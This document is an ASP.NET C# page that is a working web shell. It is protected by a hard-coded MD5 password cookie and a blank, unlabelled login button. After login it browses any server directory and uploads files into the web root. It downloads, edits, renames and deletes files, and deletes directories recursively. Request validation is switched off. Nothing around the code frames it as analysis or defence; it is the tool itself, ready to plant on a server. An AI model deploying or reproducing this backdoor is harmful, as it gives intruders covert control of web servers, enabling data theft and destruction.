<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ Import Namespace="System.Security"%>
<script runat="server">
    public const string pCookie = "Password";
    public const string Password = "ad6317f7b0a528136c19cd925f41a01f";//kaz
    protected void Page_Load(object sender, EventArgs e)
    {
        JscriptSender(this);
        
        if (!CheckLogin()) return;
        if (IsPostBack)
        {
            string trg=Request["__EVENTTARGET"];
            string pth = Request["__File"];
            if (trg != "")
            {
                switch (trg)
                {
                    case "Listdir":
                        ListDir(frmb64(pth));
                        break;
                    case "deldir":
                        deldir(frmb64(pth));
                        break;
                    case "dwfile":
                        dwfile(frmb64(pth));
                        break;
                    case "edfile":
                        Bin_CreateFile(pth);
                        break;
                    case "dlfile":
                        DeleteFile(frmb64(pth));
                        break;
                }
                 
            }
            if (trg.StartsWith("ren"))
            {
                rnm(frmb64(trg.Replace("ren", "")), pth);
            }
        }
        else 
        {
            SetPath();
            ListDir(txtDir.Value);
        }
    }

    bool CheckLogin()
    {
        if (Request.Cookies[pCookie] == null)
        { 
            ShowLogin();
            return false;
        }
        else
        {
            if (Request.Cookies[pCookie].Value == Password)
            { ShowHome(); return true; }
            else
            { ShowLogin(); return false; }
        }        
    }

    void SetPath()
    {
        if (txtDir.Value == "")
        {
            txtDir.Value = BuildingPath(Server.MapPath(".")); 
        }
    }

    string BuildingPath(string Path)
    {
        if (!Path.EndsWith(@"\"))
            Path += @"\";
        return Path;
    }
    
    void ShowHome()
    {
        uploader.Visible = true;
        Login.Visible = false;
        FileManager.Visible = true;
        SetPath();
    }

    void ShowLogin()
    {
        Login.Visible = true;
        FileManager.Visible = false;
        uploader.Visible = false;
    }
    
    protected void upl_Click(object sender, EventArgs e) {
        try{
            if (fu.HasFile)
            {
                fu.SaveAs(Server.MapPath("~") + "\\" + Path.GetFileName(fu.FileName));
                ShowNotification("Upload Success");
            }
        }
        catch {
            ShowNotification("Upload Failed");
        }
        ListDir(txtDir.Value);
    }

    protected void btnLogin_Click(object sender, EventArgs e)
    {
        string MD5Pass = FormsAuthentication.HashPasswordForStoringInConfigFile(txtPass.Text, "MD5").ToLower();
        if (Password == MD5Pass)
        {
            Response.Cookies.Add(new HttpCookie(pCookie, MD5Pass));
        }
    }

    private string btb64(string instr)
    {
        byte[] tmp = Encoding.UTF8.GetBytes(instr);
        return Convert.ToBase64String(tmp);
    }
    private string frmb64(string instr)
    {
        byte[] tmp = Convert.FromBase64String(instr);
        return Encoding.UTF8.GetString(tmp);
    }
    
    void ListDir(string Path)
    {
        try
        {
            Editor.Visible = false;
            txtDir.Value = BuildingPath(Path);
            DirectoryInfo objects = new DirectoryInfo(Path);

            if (Directory.GetParent(Path) != null)
            {
                TableRow ParentRow = new TableRow();
                ParentRow.CssClass = "head";

                TableCell parentcell1 = new TableCell();
                parentcell1.Text = "<a href=\"javascript:Bin_PostBack('Listdir','" + btb64(Directory.GetParent(Path).ToString()) + "')\"  >Parent Directory</a>";

                TableCell parentcell2 = new TableCell();
                parentcell2.Text = "--";

                TableCell parentcell3 = new TableCell();
                parentcell3.Text = "--";

                ParentRow.Cells.Add(parentcell1);
                ParentRow.Cells.Add(parentcell2);
                ParentRow.Cells.Add(parentcell3);

                tblFile.Rows.Add(ParentRow);
            }


            foreach (DirectoryInfo di in objects.GetDirectories())
            {
                TableRow tr = new TableRow();
                tr.CssClass = "head";
                TableCell namecell = new TableCell();
                namecell.Text = "<a href=\"javascript:Bin_PostBack('Listdir','" + btb64(txtDir.Value + di.Name) + "')\" >" + di.Name + "</a>";

                TableCell sizecell = new TableCell();
                sizecell.Text = "--";

                TableCell actioncell = new TableCell();
                actioncell.Text = "<a href=\"javascript:if(confirm('Are you sure will delete it ?If non-empty directory,will be delete all the files.')){Bin_PostBack('deldir','" + btb64(txtDir.Value + di.Name) + "')};\" >Del</a> | <a href='#' onclick=\"var filename=prompt('Please input the new folder name:','" + di.Name.Replace("'", "\\'") + "');if(filename){Bin_PostBack('ren" + btb64(txtDir.Value + di.Name) + "',filename);} \" >Rename</a>";

                tr.Cells.Add(namecell);
                tr.Cells.Add(sizecell);
                tr.Cells.Add(actioncell);

                tblFile.Rows.Add(tr);
            }

            foreach (FileInfo di in objects.GetFiles())
            {
                TableRow tr = new TableRow();
                tr.CssClass = "head";
                TableCell namecell = new TableCell();
                namecell.Text = "<span >" + di.Name + "</span>";

                TableCell sizecell = new TableCell();
                sizecell.Text = "<span >" + di.Length.ToString() + " bytes</span>";

                TableCell actioncell = new TableCell();
                actioncell.Text = "<a href=\"#\" onclick=\"Bin_PostBack('dwfile','" + btb64(txtDir.Value + di.Name) + "')\" >Down</a> | <a href=\"#\" onclick=\"Bin_PostBack('edfile','" + di.Name + "')\" >Edit</a> | <a href='#' onclick=\"var filename=prompt('Please input the new file name(full path):','" + di.Name.Replace("'", "\\'") + "');if(filename){Bin_PostBack('ren" + btb64(txtDir.Value + di.Name) + "',filename);} \" >Rename</a> | <a href=\"javascript:if(confirm('Are you sure will delete it ?')){Bin_PostBack('dlfile','" + btb64(txtDir.Value + di.Name) + "')};\" >Del</a>";

                tr.Cells.Add(namecell);
                tr.Cells.Add(sizecell);
                tr.Cells.Add(actioncell);

                tblFile.Rows.Add(tr);
            }
        }
        catch (Exception ex)
        {
            ShowNotification(ex.Message); 
        }
    }
    private void deldir(string dirstr)
    {
        try
        {
            Directory.Delete(dirstr, true);
            ShowNotification(dirstr + " Delete Success");
        }
        catch (Exception error)
        {
            ShowNotification(error.Message);
        }
        ListDir(Directory.GetParent(dirstr).ToString());
    }

    private void DeleteFile(string FileName)
    {
        try
        {
            File.Delete(FileName);
            ShowNotification(FileName + " Delete Success");
        }
        catch (Exception ex)
        {
            ShowNotification(ex.Message);
        }
        ListDir(txtDir.Value);
    }
    
    private void rnm(string source, string dire)
    {
        try
        {
            dire = Path.Combine(txtDir.Value, dire);
            Directory.Move(source, dire);
            ShowNotification("Rename Success");
        }
        catch (Exception error)
        {
            ShowNotification(error.Message);
        }
        ListDir(txtDir.Value);
    }

    private void Bin_CreateFile(string path)
    {
        FileManager.Visible = false;
        Editor.Visible = true;
        if (path.IndexOf(":") < 0)
        {
            Bin_TextBox_Fp.Value = txtDir.Value + path;
        }
        else
        {
            Bin_TextBox_Fp.Value = path;
        }
        if (File.Exists(Bin_TextBox_Fp.Value))
        {
            StreamReader sr = new StreamReader(Bin_TextBox_Fp.Value, Encoding.Default);
            Bin_Textarea_Edit.InnerText = sr.ReadToEnd();
            sr.Close();
        }
        else
        {
            Bin_Textarea_Edit.InnerText = "";
        }
    }
    
    private void dwfile(string path)
    {
        FileStream fs = null;
        byte[] buffer = new byte[0x1000];
        int count = 0;
        try
        {
            FileInfo fi = new FileInfo(path);
            fs = fi.OpenRead();
            Response.Clear();
            Response.ClearHeaders();
            Response.Buffer = false;
            this.EnableViewState = false;
            Response.AddHeader("Content-Disposition", "attachment;filename=" + HttpUtility.UrlEncode(fi.Name, System.Text.Encoding.UTF8));
            Response.AddHeader("Content-Length", fi.Length.ToString());
            Response.ContentType = "application/octet-stream";
            count = fs.Read(buffer, 0, 0x1000);
            while (count > 0)
            {
                Response.OutputStream.Write(buffer, 0, count);
                Response.Flush();
                count = fs.Read(buffer, 0, 0x1000);
            }
            Page.Response.Flush();
            Response.End();
        }
        catch (Exception ex) { ShowNotification(ex.Message); }
        finally { if (fs != null) { fs.Close(); } }
    }
    
    public static void JscriptSender(System.Web.UI.Page page)
    {
        page.RegisterHiddenField("__EVENTTARGET", "");
        page.RegisterHiddenField("__FILE", "");
        string s = @"<script language=Javascript>";
        s += @"function Bin_PostBack(eventTarget,eventArgument)";
        s += @"{";
        s += @"var theform=document.forms[0];";
        s += @"theform.__EVENTTARGET.value=eventTarget;";
        s += @"theform.__FILE.value=eventArgument;";
        s += @"theform.submit();theform.__EVENTTARGET.value="""";theform.__FILE.value=""""";
        s += @"} ";
        s += @"</scr" + "ipt>";
        page.RegisterStartupScript("", s);
    }

    protected void Bin_Button_Save_Click(object sender, EventArgs e)
    {
        try
        {
            StreamWriter sw = new StreamWriter(Bin_TextBox_Fp.Value, false, Encoding.Default);
            sw.Write(Bin_Textarea_Edit.InnerText);
            sw.Close();
            ShowNotification("Saved");
        }
        catch (Exception error)
        {
            ShowNotification(error.Message);
        }
        ListDir(txtDir.Value);
    }

    void ShowNotification(string Notification)
    {
        Response.Write("<center><span class=\"notify\">" + Notification + "</span></center>");
    }
    
    protected void btnGo_Click(object sender, EventArgs e)
    {
        ListDir(txtDir.Value);
    }
</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <style type="text/css">
        .bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;}
        .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:20px;}
        .head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font:11px Verdana;}
        .myFont{font:11px Verdana;}
        .notify{font:11px Verdana; color:red;font-weight:bold;}
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <%--Login--%>
        <center>
        <div id="Login" runat="server" style=" margin:15px" enableviewstate="false" visible="false" >
		<asp:TextBox ID="txtPass" runat="server"></asp:TextBox>
		<asp:Button ID="btnLogin" runat="server" Text="" OnClick="btnLogin_Click"/>
         <br />
	    </div>
         
        <%--Uploader--%>
        <div id="uploader" runat="server" enableviewstate="false">
        <asp:FileUpload ID="fu" runat="server" CssClass="bt" />
        <asp:Button ID="upl" runat="server" Text="Upload" CssClass="bt" OnClick="upl_Click" />
        </div>

        <%--FileList--%>
	    <div id="FileManager" runat="server">
	    <table width="80%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
        <tr>
	    <td style="font:11px Verdana;white-space:nowrap">Current Directory : </td>
	    <td style=" width:100%"><input class="input" id="txtDir" type="text" style="width:97%;margin:0 8px;font:11px Verdana;" runat="server"/>
	    </td>
	    <td style="white-space:nowrap" ><asp:Button ID="btnGo" runat="server" Text="Go" CssClass="bt" OnClick="btnGo_Click"/></td>
        </tr>
	    </table>
	    <asp:Table ID="tblFile" runat="server" Width="80%" CellSpacing="0" >
		<asp:TableRow CssClass="head"><asp:TableCell>Filename</asp:TableCell><asp:TableCell Width="15%">Size</asp:TableCell><asp:TableCell Width="25%">Action</asp:TableCell></asp:TableRow>
		</asp:Table>
	    </div>

        <%--FileEdit--%>
	    <div id="Editor" runat="server" visible="false">
	    <input class="input" id="Bin_TextBox_Fp" type="text" size="100" runat="server"/>
	    </p>
	    <p class="myFont">File Content<br/>
	    <textarea id="Bin_Textarea_Edit" runat="server" class="area" cols="100" rows="25" enableviewstate="false" ></textarea>
	    </p>
	    <p><asp:Button ID="Bin_Button_Save" runat="server" Text="Submit" CssClass="bt" OnClick="Bin_Button_Save_Click"/> </p>
	    </div>
        </center>
    </form>
</body>
</html>
